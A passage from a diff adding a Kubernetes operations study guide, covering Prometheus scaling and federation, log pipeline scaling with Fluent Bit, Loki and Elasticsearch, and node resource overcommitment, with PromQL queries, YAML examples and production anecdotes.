+sum(container_memory_working_set_bytes) by (node)
+
+# Pressure conditions:
+kube_node_status_condition{condition=~"MemoryPressure|DiskPressure|PIDPressure"}
+```
+
+**Pod-level:**
+
+```promql
+# Restart rate:
+rate(kube_pod_container_status_restarts_total[5m])
+
+# Resource usage vs requests:
+container_memory_working_set_bytes / 
+  on(namespace, pod, container) kube_pod_container_resource_requests{resource="memory"}
+
+# CPU throttling:
+rate(container_cpu_cfs_throttled_periods_total[5m]) /
+  rate(container_cpu_cfs_periods_total[5m])
+```
+
+**Dashboard best practices:**
+
+**Dashboard 1: Executive overview**
+
+High-level health for stakeholders:
+- Service availability
+- Key business metrics
+- Major incidents
+
+**Dashboard 2: Service-specific**
+
+For each service:
+- RED metrics (rate, errors, duration)
+- Saturation (CPU, memory, queue)
+- Dependencies
+
+**Dashboard 3: Infrastructure**
+
+For ops/SRE:
+- Cluster health
+- Node status
+- Resource utilization
+
+**Dashboard 4: Investigation**
+
+For debugging:
+- Drill-down by pod/container
+- Correlation with deploys
+- Custom queries
+
+**Tools:**
+
+**Metrics:**
+- Prometheus (de facto standard)
+- Cortex/Mimir (scaled Prometheus)
+- Thanos (long-term Prometheus)
+- VictoriaMetrics
+- Cloud providers (CloudWatch, Stackdriver)
+
+**Tracing:**
+- Jaeger
+- Tempo (Grafana)
+- Zipkin
+- Datadog APM
+- AWS X-Ray
+
+**Logs:**
+- Loki (lightweight)
+- Elasticsearch (powerful, heavy)
+- Fluent Bit (log shipper)
+- Vector (modern log shipper)
+
+**Visualization:**
+- Grafana
+- Kibana
+- Datadog dashboards
+
+**Production scenarios:**
+
+1. **Multi-window alerts reduced noise**: Single 5-min alerts fired constantly during minor blips. Implemented 5-min + 1-hour windows. Noise reduced 80%, real issues still caught.
+
+2. **SLO-based alerting**: Switched from threshold-based to SLO-based alerts. Error budget consumption rate dictated alert severity. More relevant alerts.
+
+3. **OpenTelemetry standardization**: Each team had their own observability stack. Migrated everyone to OpenTelemetry. Unified dashboards across all services possible.
+
+4. **Capacity planning saved peak**: Historical data showed 30% growth quarter-over-quarter. Provisioned capacity ahead. Black Friday handled smoothly.
+
+5. **Monitoring HA prevented blackout**: Primary Prometheus died during incident. HA setup (Thanos) continued providing data. Issue diagnosed and resolved without blackout.
+
+---
+
+## 210. How do you optimize Prometheus scalability?
+
+Prometheus is the de facto standard for Kubernetes monitoring. As clusters grow, Prometheus scaling becomes essential.
+
+**Prometheus scalability limits:**
+
+A single Prometheus instance handles:
+- ~1-10 million time series
+- ~100k-1M samples/second
+- 100s of GB of data
+
+Beyond this, you need scaling strategies.
+
+**Optimization 1: Reduce cardinality**
+
+Cardinality = number of unique label combinations.
+
+High cardinality kills Prometheus:
+
+```promql
+# Bad: high cardinality
+http_requests_total{user_id="12345", path="/foo"}
+# Each unique user_id creates new series
+
+# Good: low cardinality
+http_requests_total{path="/foo", status="200"}
+```
+
+Avoid:
+- User IDs as labels
+- Request IDs
+- High-variance values
+
+Use trace IDs in traces, not metrics.
+
+**Optimization 2: Drop unused metrics**
+
+Prometheus stores all scraped metrics. Drop unused ones:
+
+```yaml
+scrape_configs:
+  - job_name: 'app'
+    metric_relabel_configs:
+      - source_labels: [__name__]
+        regex: 'go_gc_.*|process_.*'
+        action: drop
+```
+
+Reduces storage and query overhead.
+
+**Optimization 3: Adjust scrape interval**
+
+Default: 15s. Higher (30s, 60s) reduces:
+- Storage (fewer samples)
+- CPU (fewer scrapes)
+
+But: lower resolution for short-lived events.
+
+```yaml
+scrape_configs:
+  - job_name: 'app'
+    scrape_interval: 30s   # Default 15s
+```
+
+**Optimization 4: Adjust retention**
+
+```yaml
+# Prometheus args:
+--storage.tsdb.retention.time=15d   # Default 15d
+--storage.tsdb.retention.size=100GB
+```
+
+Shorter retention = less disk, faster queries.
+
+**Optimization 5: Recording rules**
+
+Pre-compute expensive queries:
+
+```yaml
+groups:
+  - name: expensive
+    interval: 1m
+    rules:
+      - record: cluster:cpu:usage:rate5m
+        expr: sum(rate(container_cpu_usage_seconds_total[5m]))
+```
+
+Dashboards query the recorded series (fast) instead of computing on every load.
+
+**Optimization 6: Federation**
+
+Hierarchical Prometheus:
+
+```
+Cluster Prometheuses (gather local data)
+  → Global Prometheus (federates summary metrics)
+```
+
+```yaml
+# Global Prometheus federation config:
+scrape_configs:
+  - job_name: 'federate'
+    honor_labels: true
+    metrics_path: '/federate'
+    params:
+      'match[]':
+        - '{job="prometheus"}'
+        - '{__name__=~"job:.*"}'
+    static_configs:
+      - targets:
+          - 'cluster1-prometheus:9090'
+          - 'cluster2-prometheus:9090'
+```
+
+Each cluster has its own Prometheus; global aggregates.
+
+**Optimization 7: Sharding**
+
+Split workload across multiple Prometheus instances:
+
+```yaml
+# Prometheus 1 scrapes pods in namespace A:
+scrape_configs:
+  - job_name: 'pods'
+    kubernetes_sd_configs:
+      - role: pod
+        namespaces:
+          names: ['namespace-a']
+
+# Prometheus 2 scrapes pods in namespace B:
+# Different config
+
+# Etc.
+```
+
+Multiple Prometheuses, each handling subset.
+
+**Optimization 8: Thanos**
+
+Long-term storage and global query:
+
+```
+Cluster Prometheuses (short retention)
+  ↓ (Sidecar uploads to object storage)
+Object Storage (S3, GCS) - long-term
+  ↓
+Thanos Query (queries Prometheuses + Store)
+  ↓
+Grafana
+```
+
+Benefits:
+- Cheap long-term storage (object storage)
+- HA queries (multiple Prometheuses)
+- Single query endpoint for multiple clusters
+
+```yaml
+# Thanos sidecar (deployed with Prometheus):
+- name: thanos-sidecar
+  image: quay.io/thanos/thanos:v0.32.0
+  args:
+    - sidecar
+    - --tsdb.path=/prometheus
+    - --prometheus.url=http://localhost:9090
+    - --objstore.config-file=/etc/thanos/config.yaml
+```
+
+**Optimization 9: Mimir / Cortex**
+
+Multi-tenant TSDB, horizontally scalable:
+
+```yaml
+# Grafana Mimir example:
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: mimir-ingester
+spec:
+  replicas: 5
+  # Distributed write path
+```
+
+Cortex/Mimir architecture:
+- Distributors (receive metrics)
+- Ingesters (store recent data)
+- Storage (long-term)
+- Queriers (run queries)
+
+Each component scales independently. Used by very large organizations.
+
+**Optimization 10: VictoriaMetrics**
+
+Alternative to Prometheus storage:
+
+```yaml
+# VictoriaMetrics single-node or cluster:
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: victoriametrics
+spec:
+  template:
+    spec:
+      containers:
+        - name: vm
+          image: victoriametrics/victoria-metrics:latest
+          args:
+            - "-retentionPeriod=12"   # 12 months
+```
+
+Claims better performance than Prometheus, especially for high cardinality.
+
+**Optimization 11: Resource provisioning**
+
+```yaml
+resources:
+  requests:
+    cpu: 4
+    memory: 16Gi
+  limits:
+    memory: 32Gi
+```
+
+Prometheus is memory-hungry:
+- ~3-4 bytes per sample in memory
+- Plus overhead, query workspace
+
+For 5 million series with 15s scrape: 20+ GB memory.
+
+**Storage considerations:**
+
+```yaml
+volumeClaimTemplates:
+  - metadata:
+      name: storage
+    spec:
+      storageClassName: fast-ssd
+      resources:
+        requests:
+          storage: 500Gi
+```
+
+- Fast storage (NVMe, SSD)
+- Adequate capacity
+- Backups
+
+**Common issues:**
+
+**Issue 1: High memory usage**
+
+Causes:
+- Too many series (cardinality)
+- Long retention
+- Active queries
+
+Fix: cardinality reduction, sharding, more memory.
+
+**Issue 2: Slow queries**
+
+Causes:
+- Complex queries
+- Long time ranges
+- High cardinality
+
+Fix: recording rules, query optimization, sharding.
+
+**Issue 3: Scrape failures**
+
+Targets unreachable or slow:
+
+```promql
+up{job="my-app"} == 0
+```
+
+Investigate target health.
+
+**Issue 4: Storage filling up**
+
+```promql
+prometheus_tsdb_storage_blocks_bytes > 400e9
+```
+
+Reduce retention or scale storage.
+
+**Monitoring Prometheus itself:**
+
+```promql
+# Prometheus health:
+up{job="prometheus"}
+
+# Sample ingestion rate:
+rate(prometheus_tsdb_head_samples_appended_total[5m])
+
+# Series count:
+prometheus_tsdb_head_series
+
+# Query performance:
+histogram_quantile(0.99, rate(prometheus_engine_query_duration_seconds_bucket[5m]))
+
+# Memory:
+process_resident_memory_bytes
+```
+
+Alert on Prometheus issues - if monitoring fails, you're blind.
+
+**Production patterns:**
+
+**Pattern 1: Per-cluster Prometheus + Thanos**
+
+Each cluster has Prometheus with short retention. Thanos provides global query and long-term storage.
+
+**Pattern 2: Centralized Mimir**
+
+Push metrics from all clusters to central Mimir. Horizontally scalable.
+
+**Pattern 3: Managed Prometheus**
+
+- AWS Managed Prometheus
+- Grafana Cloud
+- Datadog (different model)
+
+Offload operational burden, pay for service.
+
+**Production scenarios:**
+
+1. **High cardinality crashed Prometheus**: Application added user_id as label. Series count exploded from 1M to 50M. Prometheus OOMed. Fix: removed label, used trace correlation instead.
+
+2. **Thanos for long-term storage**: Need 1 year retention. Single Prometheus impossible. Deployed Thanos. Hot data in Prometheus (15 days), historical in S3. Query performance acceptable.
+
+3. **Sharded Prometheus for large cluster**: Single Prometheus couldn't handle 5000-node cluster. Sharded by namespace. 4 Prometheuses, each handling subset. Thanos for unified queries.
+
+4. **Migration to Mimir**: Outgrew Prometheus scalability. Migrated to Grafana Mimir. Horizontal scaling, multi-tenancy, no operational pain.
+
+5. **Recording rules saved CPU**: Complex queries on Grafana caused Prometheus high CPU. Added recording rules. Queries hit pre-computed data. Prometheus CPU dropped 70%.
+
+---
+
+## 211. Explain federation in Prometheus
+
+Prometheus federation lets one Prometheus scrape selected metrics from another Prometheus. Used for hierarchical or cross-cluster aggregation.
+
+**Federation use cases:**
+
+**Use case 1: Cluster-of-clusters**
+
+```
+Cluster 1 Prometheus (detailed metrics)
+Cluster 2 Prometheus (detailed metrics)
+Cluster 3 Prometheus (detailed metrics)
+         ↓ (aggregate metrics)
+Global Prometheus (cross-cluster view)
+```
+
+Each cluster has full detail. Global has summary across clusters.
+
+**Use case 2: Hierarchical aggregation**
+
+```
+Service Prometheuses (per-service detail)
+         ↓
+Department Prometheus (per-department summary)
+         ↓
+Organization Prometheus (overall view)
+```
+
+Different teams can run their own Prometheus, organization sees aggregate.
+
+**Use case 3: Long-term archive**
+
+```
+Live Prometheus (15d retention)
+         ↓ (downsampled federation)
+Archive Prometheus (years retention)
+```
+
+Live data detailed; archive less detailed but longer.
+
+**How federation works:**
+
+Prometheus exposes a special `/federate` endpoint:
+
+```bash
+curl http://prometheus:9090/federate \
+  --data-urlencode 'match[]={job="my-job"}'
+```
+
+Returns metrics matching the selector in Prometheus text format.
+
+Another Prometheus scrapes this endpoint:
+
+```yaml
+scrape_configs:
+  - job_name: 'federate'
+    scrape_interval: 60s
+    honor_labels: true
+    metrics_path: '/federate'
+    params:
+      'match[]':
+        - '{job="prometheus"}'
+        - '{__name__=~"job:.*"}'
+        - '{__name__=~"node:.*"}'
+    static_configs:
+      - targets:
+          - 'cluster1-prometheus:9090'
+          - 'cluster2-prometheus:9090'
+          - 'cluster3-prometheus:9090'
+```
+
+The global Prometheus stores aggregated metrics from each cluster.
+
+**Federation patterns:**
+
+**Pattern 1: Aggregate via recording rules**
+
+Each cluster Prometheus pre-computes aggregates:
+
+```yaml
+# Cluster Prometheus:
+groups:
+  - name: aggregation
+    rules:
+      - record: cluster:cpu:usage:rate5m
+        expr: sum(rate(container_cpu_usage_seconds_total[5m]))
+      - record: cluster:memory:usage:bytes
+        expr: sum(container_memory_working_set_bytes)
+```
+
+Global Prometheus federates these (low cardinality):
+
+```yaml
+params:
+  'match[]':
+    - '{__name__=~"cluster:.*"}'
+```
+
+Best practice: federate aggregates, not raw metrics.
+
+**Pattern 2: Limited metric selection**
+
+```yaml
+params:
+  'match[]':
+    - '{job="api-server"}'        # Only API server metrics
+    - '{__name__=~"sli_.*"}'      # Only SLI metrics
+```
+
+Don't federate everything; cherry-pick what matters globally.
+
+**Federation limitations:**
+
+**Limitation 1: Cardinality multiplication**
+
+If each cluster has 1M series and you federate all, global Prometheus has 5M series (5 clusters). Quickly hits scaling issues.
+
+Mitigation: federate aggregates only.
+
+**Limitation 2: Latency in scrape**
+
+Federation pulls from many sources, can be slow:
+
+```yaml
+scrape_timeout: 30s   # May need longer
+```
+
+**Limitation 3: Network bandwidth**
+
+Federation traffic across clusters can be significant. Especially cross-region.
+
+**Limitation 4: Eventual consistency**
+
+Global Prometheus has data 1-2 scrape intervals behind clusters. Not real-time.
+
+**Limitation 5: Single point of failure**
+
+Global Prometheus failure = no global view. Need HA or alternatives.
+
+**Federation vs. alternatives:**
+
+**Vs. Thanos:**
+
+Thanos provides:
+- Global query (queries multiple Prometheuses on the fly)
+- Long-term storage in object storage
+- Better than federation for many use cases
+
+**Vs. Mimir/Cortex:**
+
+Push-based architecture:
+- Prometheuses push to central
+- Multi-tenant
+- Horizontally scalable
+
+**Vs. Cross-cluster service mesh:**
+
+Service mesh provides metrics for mesh-managed services. Limited scope.
+
+**When federation makes sense:**
+
+- Simple aggregation needs
+- Existing Prometheus infrastructure
+- Not too many sources
+- Aggregated metrics, not raw
+
+**When to use alternatives:**
+
+- Many clusters (5+)
+- High cardinality
+- Need long-term storage
+- Need real-time global queries
+
+**Configuration example:**
+
+**Cluster-level Prometheus (one per cluster):**
+
+```yaml
+# Standard Prometheus, scraping local services
+# Adds recording rules for aggregation
+groups:
+  - name: cluster_aggregation
+    interval: 30s
+    rules:
+      - record: cluster:api_server_request_rate
+        expr: sum(rate(apiserver_request_total[5m]))
+      
+      - record: cluster:nodes_total
+        expr: count(up{job="node-exporter"})
+      
+      - record: cluster:pods_total
+        expr: count(kube_pod_info)
+```
+
+**Global Prometheus:**
+
+```yaml
+scrape_configs:
+  - job_name: 'federate'
+    scrape_interval: 60s   # Less frequent than primary
+    honor_labels: true
+    metrics_path: '/federate'
+    params:
+      'match[]':
+        - '{__name__=~"cluster:.*"}'   # Only aggregates
+    relabel_configs:
+      - source_labels: [__address__]
+        target_label: cluster
+        regex: '(.+):9090'
+        replacement: '$1'
+    static_configs:
+      - targets:
+          - 'prometheus.cluster-1.example.com:9090'
+          - 'prometheus.cluster-2.example.com:9090'
+          - 'prometheus.cluster-3.example.com:9090'
+```
+
+Now in global Prometheus, can query:
+
+```promql
+# Total nodes across all clusters:
+sum(cluster:nodes_total)
+
+# Per-cluster view:
+sum(cluster:nodes_total) by (cluster)
+```
+
+**Cross-cluster alerting:**
+
+Global Prometheus can alert on cluster-wide conditions:
+
+```yaml
+groups:
+  - name: global-alerts
+    rules:
+      - alert: ClusterDown
+        expr: cluster:nodes_total == 0
+        for: 5m
+        annotations:
+          summary: "Cluster {{ $labels.cluster }} appears to be down"
+```
+
+**Production scenarios:**
+
+1. **Multi-cluster federation for HQ view**: 5 regional clusters. Federation gave HQ-level dashboard. Aggregate metrics from each cluster.
+
+2. **Federation outgrew, migrated to Thanos**: Started with federation. Grew to 15 clusters. Federation became slow and incomplete. Migrated to Thanos. Better.
+
+3. **Failed federation due to high cardinality**: Tried to federate raw metrics. Global Prometheus OOMed. Switched to federating only recording rules. Worked.
+
+4. **Hierarchical federation**: Service teams ran their own Prometheus. Platform team's Prometheus federated team aggregates. Org-level dashboard.
+
+5. **Federation for archive**: Live Prometheus retention 30 days. Federated downsampled data to archive Prometheus with 2-year retention. Useful for capacity planning.
+
+---
+
+## 212. How do you scale logging systems?
+
+Logs are a critical operational tool but grow rapidly. Scaling logging infrastructure to handle volume while maintaining query capability is a major challenge.
+
+**Log volume math:**
+
+A reasonable estimate:
+- Each pod: 1-100 MB logs/day (variable)
+- 1000 pods: 1-100 GB/day
+- 10000 pods: 10 GB - 1 TB/day
+
+High-traffic clusters can generate multi-TB daily.
+
+**Logging architecture:**
+
+```
+Application stdout/stderr
+  ↓
+Container runtime captures
+  ↓
+Node-level log files (/var/log/pods/)
+  ↓
+Log shipper (Fluent Bit, Promtail, Vector)
+  ↓
+Aggregator / Indexer (Loki, Elasticsearch)
+  ↓
+Storage (object storage, disks)
+  ↓
+Query interface (Grafana, Kibana)
+```
+
+**Scaling each layer:**
+
+**Layer 1: Application logging**
+
+Most direct: log less.
+
+**Best practice 1: Log levels**
+
+```python
+# Production: WARNING and above
+logging.basicConfig(level=logging.WARNING)
+
+# Avoid:
+logger.info("Processing request 123")   # Too chatty
+logger.debug("Variable x is now 5")     # Too verbose
+```
+
+Use INFO for important state changes, DEBUG for development.
+
+**Best practice 2: Structured logging**
+
+```python
+# Bad: free-form text:
+logger.info(f"User {user_id} logged in from {ip}")
+
+# Good: structured:
+logger.info("user_login", extra={"user_id": user_id, "ip": ip})
+
+# Output as JSON:
+{"event":"user_login","user_id":"123","ip":"1.2.3.4","timestamp":"..."}
+```
+
+Easier to parse, filter, and analyze.
+
+**Best practice 3: Sample high-volume logs**
+
+```python
+# Sample 1 in 100 log entries:
+if random() < 0.01:
+    logger.info("normal_request", extra={...})
+```
+
+Logging every successful request is overkill. Sample.
+
+**Best practice 4: Use distributed tracing for detail**
+
+Don't log every step. Use tracing:
+
+```python
+with tracer.start_span("operation"):
+    do_work()
+```
+
+Traces sampled and queried separately.
+
+**Layer 2: Log shipping**
+
+**Fluent Bit:**
+
+Lightweight log shipper:
+
+```yaml
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: fluent-bit
+spec:
+  template:
+    spec:
+      containers:
+        - name: fluent-bit
+          image: fluent/fluent-bit:2.2.0
+          resources:
+            requests:
+              cpu: 100m
+              memory: 100Mi
+            limits:
+              memory: 500Mi
+```
+
+Resource-efficient (compared to Fluentd).
+
+**Vector:**
+
+Modern alternative:
+
+```yaml
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: vector
+spec:
+  template:
+    spec:
+      containers:
+        - name: vector
+          image: timberio/vector:latest
+```
+
+Fast, modern, supports many sources/sinks.
+
+**Promtail:**
+
+For Loki:
+
+```yaml
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: promtail
+```
+
+Optimized for Loki.
+
+**Tuning log shippers:**
+
+```yaml
+# Fluent Bit config:
+[SERVICE]
+    Flush         5
+    Daemon        Off
+    Log_Level     info
+    Parsers_File  parsers.conf
+    HTTP_Server   On
+    HTTP_Listen   0.0.0.0
+    HTTP_Port     2020
+
+[INPUT]
+    Name              tail
+    Path              /var/log/containers/*.log
+    Parser            cri
+    Tag               kube.*
+    Refresh_Interval  5
+    Rotate_Wait       30
+    Mem_Buf_Limit     50MB
+    Skip_Long_Lines   On
+```
+
+- `Mem_Buf_Limit`: max memory buffer
+- `Flush`: how often to send (faster = more network, less buffering)
+- `Skip_Long_Lines`: skip lines longer than max
+
+**Filtering at the shipper:**
+
+Drop noisy logs before shipping:
+
+```yaml
+[FILTER]
+    Name    grep
+    Match   *
+    Exclude log .*HealthCheck.*
+```
+
+Don't ship health check logs (noisy, low value).
+
+**Layer 3: Log aggregator**
+
+**Loki (efficient):**
+
+```yaml
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: loki
+spec:
+  replicas: 3
+  template:
+    spec:
+      containers:
+        - name: loki
+          image: grafana/loki:2.9.0
+```
+
+Loki indexes only labels, not content. Cheaper than Elasticsearch for similar volume.
+
+**Elasticsearch (powerful):**
+
+```yaml
+apiVersion: elasticsearch.k8s.elastic.co/v1
+kind: Elasticsearch
+metadata:
+  name: production
+spec:
+  version: 8.10.0
+  nodeSets:
+    - name: master
+      count: 3
+    - name: data
+      count: 6
+```
+
+Powerful queries but expensive (lots of memory, disk).
+
+**Cloud-managed:**
+
+- AWS CloudWatch Logs
+- GCP Cloud Logging
+- Azure Monitor Logs
+- Datadog Logs
+- Splunk
+
+Offload operational burden.
+
+**Layer 4: Storage**
+
+For Loki: object storage (S3, GCS):
+
+```yaml
+# Loki config:
+storage_config:
+  aws:
+    s3: s3://my-loki-bucket
+    region: us-east-1
+```
+
+Cheap, scalable.
+
+For Elasticsearch: hot/warm/cold:
+
+```yaml
+# Hot tier: fast SSD, recent logs
+# Warm tier: slower disk, older logs  
+# Cold tier: object storage, archive
+```
+
+ILM (Index Lifecycle Management) automates transitions.
+
+**Layer 5: Retention**
+
+Logs grow forever without retention:
+
+```yaml
+# Loki retention:
+chunk_store_config:
+  max_look_back_period: 168h    # 7 days
+
+# Or:
+table_manager:
+  retention_deletes_enabled: true
+  retention_period: 168h
+```
+
+```yaml
+# Elasticsearch ILM:
+# Delete logs after 30 days
+{
+  "policy": {
+    "phases": {
+      "delete": {
+        "min_age": "30d",
+        "actions": {
+          "delete": {}
+        }
+      }
+    }
+  }
+}
+```
+
+Different retention for different log types:
+- App logs: 30 days
+- Audit logs: 1 year
+- Debug logs: 7 days
+
+**Scaling strategies:**
+
+**Strategy 1: Multi-tier**
+
+Hot tier (recent, fast access) → Warm (slower) → Cold (archive):
+
+```
+Today: SSD, full index, fast queries
+Last week: HDD, full index, slower queries
+Last month: Object storage, summarized, manual access
+```
+
+Cost-effective.
+
+**Strategy 2: Centralized vs federated**
+
+**Centralized:**
+- Single log aggregator
+- All clusters ship to it
+- Easy querying
+
+**Federated:**
+- Per-cluster log aggregator
+- Aggregate queries across clusters
+- Better data locality
+
+For large scale: federated.
+
+**Strategy 3: Selective shipping**
+
+Not all logs need to go to central:
+
+- Critical logs: ship and store long-term
+- Application logs: ship, short retention
+- Debug logs: keep local, short retention
+
+**Strategy 4: Compression**
+
+Logs compress well:
+
+```yaml
+# Loki compression:
+chunk_target_size: 1572864
+chunk_encoding: snappy   # Or zstd
+```
+
+Reduce storage and network.
+
+**Strategy 5: Pre-aggregation**
+
+Like metrics, can pre-compute log stats:
+
+```promql
+# Loki LogQL:
+sum(rate({app="my-app"} |~ "error" [5m]))
+```
+
+Recording rules for these (less common but possible).
+
+**Common issues:**
+
+**Issue 1: Log shipper OOM**
+
+Shipper can't keep up with log generation. Buffer fills, OOMs.
+
+Fix:
+- Larger buffer
+- More shipper replicas (DaemonSet usually one per node)
+- Drop logs at shipper
+
+**Issue 2: Aggregator overload**
+
+Too many logs incoming, aggregator can't index.
+
+Fix:
+- Scale aggregator
+- Sample more aggressively
+- Drop low-value logs
+
+**Issue 3: Slow queries**
+
+Searching weeks of logs:
+- Use time-range limits
+- Index optimization
+- Better query patterns
+
+**Issue 4: Cost spiraling**
+
+Log storage costs growing.
+
+Fix:
+- Retention reduction
+- Compression
+- Tiered storage
+- Audit log volume per service
+
+**Cost optimization:**
+
+For 1TB/day logging:
+
+- **Elasticsearch self-hosted**: $5000-10000/month
+- **Loki + object storage**: $500-1500/month
+- **Cloud-managed (CloudWatch)**: $5000-15000/month
+- **Datadog/Splunk**: $10000+ (per GB ingested model)
+
+Loki is often most cost-effective for K8s logs.
+
+**Production scenarios:**
+
+1. **Log volume reduction**: Application generated 500 GB/day. Found: most was debug logs accidentally enabled. Set to INFO. Down to 50 GB/day. Storage cost dropped 90%.
+
+2. **Migrated Elasticsearch to Loki**: ES cost $8000/month. Migrated to Loki + S3. Same log volume, cost $1500/month. Slower full-text search but acceptable trade-off.
+
+3. **Tiered logging**: Hot 7 days SSD, warm 30 days HDD, cold 1 year S3. Total cost 30% of single-tier hot storage.
+
+4. **Log sampling for high-traffic API**: API handled 100k req/s. Logging every request: 1TB/day. Sampled to 1% for success, 100% for errors. 10 GB/day, no loss of debugging capability.
+
+5. **Centralized to federated**: Single Loki instance hit limits. Migrated to per-region Loki + global query layer. Better data locality, scaled to needs.
+
+---
+
+## 213. Explain node overcommitment strategies
+
+Overcommitment is allocating more resources to pods than the node physically has. Done carefully, it improves utilization. Done poorly, it causes evictions and instability.
+
+**Understanding requests vs. limits:**
+
+```yaml
+resources:
+  requests:    # Used for scheduling
+    cpu: 500m
+    memory: 1Gi
+  limits:      # Hard cap on usage
+    cpu: 2000m
+    memory: 2Gi
+```
+
+**Requests:**
+- What scheduler uses to place pods
+- Reserved capacity
+- Sum across pods can't exceed node capacity
+
+**Limits:**
+- Maximum pod can use
+- Sum CAN exceed node capacity (overcommitment)
+- Hitting limit causes throttling (CPU) or OOM (memory)
+
+**Overcommitment math:**
+
+Example node: 8 CPU, 32 GB memory
+
+```
+Pod A: requests 1 CPU, limits 4 CPU
+Pod B: requests 2 CPU, limits 8 CPU
+Pod C: requests 1 CPU, limits 4 CPU
+
+Total requests: 4 CPU (node has 8 - fits)
+Total limits: 16 CPU (2x node capacity - overcommitted)
+```
+
+If all pods use their limits simultaneously, problems. If they don't (typical), saves resources.
+
+**Why overcommitment works:**
+
+Applications rarely use 100% of their limit:
+- Workloads have peaks and valleys
+- Different applications peak at different times
+- Statistical averaging across many pods
+
+If average usage is 30% of limits, 3x overcommitment is safe-ish.
+
+**Overcommitment strategies:**
+
+**Strategy 1: Conservative**
+
+```yaml
+resources:
+  requests:
+    cpu: 500m
+    memory: 1Gi
+  limits:
+    cpu: 500m   # Same as request
+    memory: 1Gi # Same as request
+```
+
+QoS: Guaranteed
+- No overcommitment
+- Predictable performance
+- Higher cost (more nodes)
+
+Use for:
+- Critical workloads
+- Latency-sensitive services
+- Workloads with consistent usage
+
+**Strategy 2: Burstable**
+
+```yaml
+resources:
+  requests:
+    cpu: 500m       # 25% of typical limit
+    memory: 1Gi
+  limits:
+    cpu: 2000m
+    memory: 2Gi
+```
+
+QoS: Burstable
+- Some overcommitment
+- Can burst above request when others quiet
+- Standard for most workloads
+
+**Strategy 3: Aggressive**
+
+```yaml
+resources:
+  requests:
+    cpu: 100m       # 5% of limit
+    memory: 256Mi
+  limits:
+    cpu: 2000m
+    memory: 2Gi
+```
+
+QoS: Burstable (very low requests)
+- High overcommitment
+- Better packing
+- Risk of pressure
+- Cheap
+
+**Strategy 4: BestEffort**
+
+```yaml
+resources: {}   # No requests/limits
+```
+
+QoS: BestEffort
+- Maximum overcommitment
+- Pods evicted first under pressure
+- Use only for non-critical batch
+
+**QoS classes and eviction order:**
+
+When node has pressure:
+
+1. **BestEffort** pods evicted first
+2. **Burstable** pods (using more than request) evicted next
+3. **Guaranteed** pods evicted last (rarely)
+
+Designing pod QoS = designing eviction priority.
+
+**Practical overcommitment ratios:**
+
+Reasonable ranges:
+
+**CPU:**
+- Conservative: 1:1 to 1:2 (request:limit)
+- Standard: 1:3 to 1:5
+- Aggressive: 1:10+
+
+**Memory:**
+- Conservative: 1:1 (Guaranteed is safest for memory)
+- Standard: 1:1.5 to 1:2
+- Risky: above 1:2 (OOM risk)
+
+Memory overcommitment is riskier than CPU because:
+- CPU pressure causes throttling (slow but alive)
+- Memory pressure causes OOM (killed)
+
+**Implementing overcommitment:**
+
+**Step 1: Measure actual usage**
+
+Run workloads, measure:
+
+```promql
+# Actual vs requested CPU:
+container_cpu_usage_seconds_total / 
+  on(pod, container) kube_pod_container_resource_requests{resource="cpu"}
+
+# Memory:
+container_memory_working_set_bytes /
+  on(pod, container) kube_pod_container_resource_requests{resource="memory"}
+```
+
+Find typical and peak ratios.
+
+**Step 2: Set requests near typical usage**
+
+If pod typically uses 200m CPU but rarely above 500m:
+
+```yaml
+resources:
+  requests:
+    cpu: 250m   # Slightly above typical
+  limits:
+    cpu: 1000m  # Allow bursts
+```
+
+**Step 3: Monitor evictions**
+
+```promql
+# Pod evictions:
+kube_pod_status_reason{reason="Evicted"}
+
+# Node pressure:
+kube_node_status_condition{condition="MemoryPressure",status="true"}
+```
+
+If evictions occur: too aggressive. Adjust.
+
+**Step 4: Iterate**
+
+- Start conservative
+- Monitor for issues
+- Gradually increase overcommitment
+- Maintain target utilization (60-70%)
+
+**VPA for sizing:**
+
+VPA recommends right-sized requests:
+
+```yaml
+apiVersion: autoscaling.k8s.io/v1
+kind: VerticalPodAutoscaler
+spec:
+  updatePolicy:
+    updateMode: "Off"   # Just recommendations
+```
+
+Use recommendations to set realistic requests.
+
+**Risks of overcommitment:**
+
+**Risk 1: Memory exhaustion**
+
+Pods all want their limits, OOMKilled.
+
+Mitigation:
+- Conservative on memory
+- Monitor memory pressure
+- Eviction thresholds with buffer
+
+**Risk 2: CPU contention**
+
+All pods at limit, CPU thrashing.
+
+Mitigation:
+- Pods experience throttling, app slowdown
+- Less catastrophic than OOM
+- Adjust requests if persistent
+
+**Risk 3: Noisy neighbors**
+
+One greedy pod affects others on same node.
+
+Mitigation:
+- Set limits
+- Topology spread (don't co-locate similar workloads)
+- Resource quotas
+
+**Risk 4: Eviction storms**
+
+Memory pressure → evict pods → kubelet uses CPU evicting → more pressure → more evictions.
+
+Mitigation:
+- Adequate kubeReserved/systemReserved
+- Don't overcommit memory aggressively
+
+**Node-level overcommit settings:**
+
+```yaml
+# Allow overcommit (default):
+overcommitMemory: 1
+overcommitRatio: 50    # Allow 50% overcommit
+```
+
+Some clusters disable overcommit for safety.
+
+**Production patterns:**
+
+**Pattern 1: Tiered nodes**
+
+```yaml
+# High-priority nodes: no overcommit
+nodes:
+  - name: critical
+    taint: critical=true:NoSchedule
+    overcommit: false
+
+# Standard nodes: moderate overcommit
+  - name: standard
+    overcommit: 2x
+
+# Batch nodes: aggressive overcommit
+  - name: batch
+    taint: batch=true:NoSchedule
+    overcommit: 5x
+```
+
+Different workloads on different node types.
+
+**Pattern 2: Mixed QoS per node**
+
+Pack Guaranteed (high priority) and BestEffort (filler) on same nodes. Improves utilization while protecting critical workloads.
+
+**Pattern 3: Time-based overcommit**
+
+```yaml
+# Daytime: critical workloads
+# Nighttime: batch jobs can use idle capacity (overcommit)
+```
+
+Use cron-based scaling.
+
+**Monitoring overcommitment:**
+
+```promql
+# Node CPU utilization:
+sum(rate(container_cpu_usage_seconds_total[5m])) by (node) /
+  sum(kube_node_status_allocatable{resource="cpu"}) by (node)
+
+# Request overcommit:
+sum(kube_pod_container_resource_requests{resource="cpu"}) by (node) /
+  sum(kube_node_status_allocatable{resource="cpu"}) by (node)
+
+# Limit overcommit:
+sum(kube_pod_container_resource_limits{resource="cpu"}) by (node) /
